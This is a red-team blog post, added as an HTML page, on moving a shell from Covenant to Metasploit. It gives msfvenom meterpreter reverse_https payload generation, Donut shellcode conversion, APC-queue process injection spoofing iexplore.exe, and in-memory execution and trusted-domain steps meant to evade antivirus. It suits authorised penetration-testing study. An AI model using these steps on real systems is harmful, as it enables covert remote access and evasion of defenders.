@@ -1,0 +1,243 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>PASSING A SHELL FROM COVENANT TO METASPLOIT // Tatula</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.68.3" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Tatula" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://t4tul4.github.io/css/main.min.e3e673b07e6fcbedc1992304863ca607d598988089b7f690a51a8297034a9c03.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="PASSING A SHELL FROM COVENANT TO METASPLOIT"/>
+<meta name="twitter:description" content="Introduction You might be wondering why i needed to move a shell/grunt from covenant to msf.
+There are a couple of reasons, they include:
+ It is open source and actively developed. Its supports large testing networks by making use of CIDR identifiers. It offers smart payload generation and switching mechanism. It has more exploits. It offers recursive download of files.  I will divide it into two parts. Part one covers starting metasploit with a valid certificate and part two covers passing a shell to msf."/>
+
+    <meta property="og:title" content="PASSING A SHELL FROM COVENANT TO METASPLOIT" />
+<meta property="og:description" content="Introduction You might be wondering why i needed to move a shell/grunt from covenant to msf.
+There are a couple of reasons, they include:
+ It is open source and actively developed. Its supports large testing networks by making use of CIDR identifiers. It offers smart payload generation and switching mechanism. It has more exploits. It offers recursive download of files.  I will divide it into two parts. Part one covers starting metasploit with a valid certificate and part two covers passing a shell to msf." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://t4tul4.github.io/posts/passing-a-shell-from-covenant-to-metasploit/" />
+<meta property="article:published_time" content="2021-04-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-04-16T00:00:00+00:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://t4tul4.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Tatula" /></a>
+      <h1>Tatula</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+      </nav>
+      <p>Infosec Enthusiast and Red teamer.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/T4tul4/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/Nyawira1" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">PASSING A SHELL FROM COVENANT TO METASPLOIT</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 16, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://t4tul4.github.io/tags/metasploit/">metasploit</a>
+              <a class="tag" href="https://t4tul4.github.io/tags/covenant/">covenant</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h3 id="introduction">Introduction</h3>
+<p>You might be wondering why i needed to move a shell/grunt from covenant to msf.</p>
+<p>There are a couple of reasons, they include:</p>
+<ul>
+<li>It is open source and actively developed.</li>
+<li>Its supports large testing networks by making use of CIDR identifiers.</li>
+<li>It offers smart payload generation and switching mechanism.</li>
+<li>It has more exploits.</li>
+<li>It offers recursive download of files.</li>
+</ul>
+<p>I will divide it into two parts. Part one covers starting metasploit with a valid certificate and part two  covers passing a shell to msf.</p>
+<h2 id="part-one">Part One</h2>
+<h3 id="starting-metasploit-with-a-valid-certificate">Starting Metasploit with a valid certificate</h3>
+<p>The  first step is to make sure that you start metasploit with a valid certificate.</p>
+<p>This step is very important as it will make sure your payload is not flagged by defender.</p>
+<h4 id="step-1">Step 1:</h4>
+<h4 id="domain-categorization">Domain Categorization</h4>
+<p>We will use a tool called <a href="https://github.com/mdsecactivebreach/Chameleon.git">Chameleon</a>,  it assists red teams in categorising their infrastructure under arbitrary categories.</p>
+<p>Currently, the tool supports arbitrary categorisation for Bluecoat, McAfee Trustedsource and IBM X-Force.</p>
+<p>Installation:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">git clone https://github.com/mdsecactivebreach/Chameleon.git 
+cd Chameleon/  
+chmod +x chameleon.py
+</code></pre></div><p>Usage:</p>
+<p>Checking the category of your website against all supported proxies.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python3 chameleon.py --proxy a --check --domain DOMAIN.COM
+</code></pre></div><p><img src="/images/Passing_a_shell/chameleon.png" alt="[chameleon.png]"></p>
+<p>Check on virus total if your domain is clean. This checks if its flagged for phishing or malicious purposes.</p>
+<p><img src="/images/Passing_a_shell/virustotal.png" alt="[virustotal.png]"></p>
+<p>You can also check if its blacklisted on MXToolBox.</p>
+<p><img src="/images/Passing_a_shell/mxtoolbox.png" alt="[mxtoolbox.png]"></p>
+<h4 id="step-2">Step 2:</h4>
+<h4 id="domains-and-dns-configuration">Domains AND DNS Configuration</h4>
+<p>We need to setup the DNS records.
+Login into <a href="https://ap.www.namecheap.com/">namecheap</a>.
+Select Domain list and choose a domain name.</p>
+<p><img src="/images/Passing_a_shell/namecheap.png" alt="[namecheap.png]"></p>
+<p>Then select manage, click the advanced DNS tab and start populating the various fields.</p>
+<p>Create two A records (@ and www) that point to your mail server’s IP address.</p>
+<p><img src="/images/Passing_a_shell/Arecord98.png" alt="[Arecord98.png]"></p>
+<p>Test your DNS propagation, use the <strong><em>A option</em></strong> using <a href="https://dnschecker.org/">Dns checker</a>.</p>
+<p><img src="/images/Passing_a_shell/dnsArecord.png" alt="[dnsArecord.png]"></p>
+<h4 id="step-3">Step 3</h4>
+<h4 id="https-certificate">HTTPS Certificate</h4>
+<p>We need to generate a https certificate for our msf.
+We are going to use <strong><em>Lets encrypt</em></strong>.
+Make sure you generate a certificate for <strong>DOMAIN.COM</strong>.</p>
+<p>Install certbot</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install certbot python3-certbot-apache
+</code></pre></div><p><img src="/images/Passing_a_shell/cerbot1.png" alt="[cerbot1.png]"></p>
+<p>This installs the certificate only.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo certbot certonly --apache --agree-tos --register-unsafely-without-email -d &lt;Domain name&gt;
+</code></pre></div><p><img src="/images/Passing_a_shell/certbot2.png" alt="[certbot2.png]"></p>
+<p>Restart the server.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">reboot
+</code></pre></div><p>Verify that you have a https certificate on your domain name.</p>
+<p><img src="/images/Passing_a_shell/certbot4.png" alt="[certbot4.png]"></p>
+<h4 id="step-4">Step 4</h4>
+<h4 id="install-metasploit">Install Metasploit</h4>
+<p>I used <a href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers">Nightly-Installers</a> wiki to install my msf.</p>
+<p><img src="/images/Passing_a_shell/msf.png" alt="[msf.png]"></p>
+<p>We then have to merge cert.pem and privatekey.pem to form one https certificate.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo cat /etc/letsencrypt/live/domainName.com/cert.pem /etc/letsencrypt/live/domainName.com/privkey.pem &gt; domainName.pem
+</code></pre></div><p><img src="/images/Passing_a_shell/https.png" alt="[https.png]"></p>
+<h4 id="step-5">Step 5</h4>
+<h4 id="start-metasploit">Start Metasploit</h4>
+<p>We are going to start metasploit with this command</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfconsole
+</code></pre></div><p><img src="/images/Passing_a_shell/startmsf.png" alt="[startmsf.png]"></p>
+<p>We&rsquo;ll use <strong>multi/handler</strong> exploit and populate the following options</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">use exploit/multi/handler  
+ 
+set payload windows/x64/meterpreter/reverse_https  
+ 
+set LHOST &lt;IP&gt;  
+ 
+set LPORT &lt;PORT&gt;  
+ 
+set HandlerSSLCert /home/t4tul4/Software/t4tul4.pem
+</code></pre></div><p><img src="/images/Passing_a_shell/msf4.png" alt="[msf4.png]"></p>
+<h4 id="step-6">Step 6</h4>
+<h4 id="process-injection">Process Injection</h4>
+<p>Start an msf payload using <strong>msfvenom</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom -p windows/x64/meterpreter/reverse_https LHOST<span style="color:#f92672">=</span>&lt;IP&gt; LPORT<span style="color:#f92672">=</span>&lt;PORT&gt; -f exe &gt; msfHttps.exe
+</code></pre></div><p><img src="/images/Passing_a_shell/msfvenom.png" alt="[msfvenom.png]"></p>
+<p>Then convert the malicious exe to shellcode using <a href="https://github.com/TheWover/donut">Donut</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./donut -a2 msfHttps.exe -o msfHttps.bin
+</code></pre></div><p><img src="/images/Passing_a_shell/donut.png" alt="[donut.png]"></p>
+<p>After generation of the payload we need to transfer the payload to your local host.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python3 -m http.server <span style="color:#ae81ff">8000</span>
+</code></pre></div><h4 id="execute-the-apc-queue-process-injection-technique">Execute the APC Queue Process Injection technique.</h4>
+<p>Process injection is a widespread defense evasion technique employed often within malware and fileless adversary tradecraft, and entails running custom code within the address space of another process.</p>
+<p>It improves stealth and some techniques also achieve persistence.</p>
+<p>I used 3xpl01tc0d3r process injection you can download from <a href="https://github.com/3xpl01tc0d3r/ProcessInjection">here</a></p>
+<p>I used the fourth technique APC Queue.</p>
+<p>An asynchronous procedure call (APC) is a function that executes asynchronously in the context of a particular thread.</p>
+<p>When an APC is queued to a thread, the system issues a software interrupt. The next time the thread is scheduled, it will run the APC function.</p>
+<p>I modified the code a bit and merged the parameters into one code.</p>
+<p>Something to note is the options i used <em><strong>/f:base64,  /t: 4 and i spoofed iexplore.exe</strong></em>.</p>
+<p>Execute the payload</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">.<span style="color:#ae81ff">\P</span>rocessInjection.exe 
+</code></pre></div><p>On process hacker we can verify that the payload spawned <strong>iexplorer.exe</strong>.</p>
+<p>Note: Always make sure that <strong>Automatic submission is off</strong>.</p>
+<p><img src="/images/Passing_a_shell/Matokeo.png" alt="[Matokeo.png]"></p>
+<p>On msf we get a shell.</p>
+<p><img src="/images/Passing_a_shell/matokeo1.png" alt="[matokeo1.png]"></p>
+<h2 id="part-two">Part Two</h2>
+<h3 id="passing-a-shell-from-covenant-to-metasploit">Passing a shell from Covenant to Metasploit</h3>
+<h4 id="step-1-1">Step 1</h4>
+<p>Start metasploit.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfconsole
+</code></pre></div><p><img src="/images/Passing_a_shell/msf4.png" alt="[msf4.png]"></p>
+<h4 id="step-2-1">Step 2</h4>
+<p>Generate a grunt in covenant.</p>
+<p><img src="/images/Passing_a_shell/pass2.png" alt="[pass2.png]"></p>
+<h4 id="step-3-1">Step 3</h4>
+<p>Interact with your grunt, click on the task tab.</p>
+<p>Choose <strong>Assembly</strong> on the GruntTask.</p>
+<p>This option will execute our exe in <strong>memory</strong>, this is an additional layer of opsec as the AVs won&rsquo;t detect it.</p>
+<p>Add your exe on the choose file option.</p>
+<p>Input any name on the AssemblyName.</p>
+<p>If your exe has parameters input them on the Parameters section.</p>
+<p>Click on Task to execute.</p>
+<p><img src="/images/Passing_a_shell/pass3.png" alt="[pass3.png]"></p>
+<h4 id="step-4-1">Step 4</h4>
+<p><strong>Results</strong></p>
+<p>In Covenant</p>
+<p><img src="/images/Passing_a_shell/cov1.png" alt="[cov1.png]"></p>
+<p>In Metasploit</p>
+<p><img src="/images/Passing_a_shell/cov2.png" alt="[cov2.png]"></p>
+<h3 id="conclusion">Conclusion</h3>
+<p>This shows how  one can move shells from one C2 to another. Its an important skill as it also acts as back up if one C2 gets burned. I hope you learned something from this short blog. Incase of any questions fell free to DM <a href="https://twitter.com/Nyawira1">me</a>. Happy Hacking !</p>
+<h3 id="special-thanks">Special Thanks</h3>
+<p>Special thanks to <a href="https://twitter.com/truneski">Truneski</a> and <a href="https://twitter.com/_thevivi">Gabriel</a> for reviewing my post.</p>
+<h3 id="references">References</h3>
+<ol>
+<li>
+<p><a href="https://thevivi.net/">https://thevivi.net/</a></p>
+</li>
+<li>
+<p><a href="https://3xpl01tc0d3r.blogspot.com/2019/12/process-injection-part-v.html">https://3xpl01tc0d3r.blogspot.com/2019/12/process-injection-part-v.html</a></p>
+</li>
+<li>
+<p><a href="https://github.com/3xpl01tc0d3r/ProcessInjection">https://github.com/3xpl01tc0d3r/ProcessInjection</a></p>
+</li>
+</ol>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
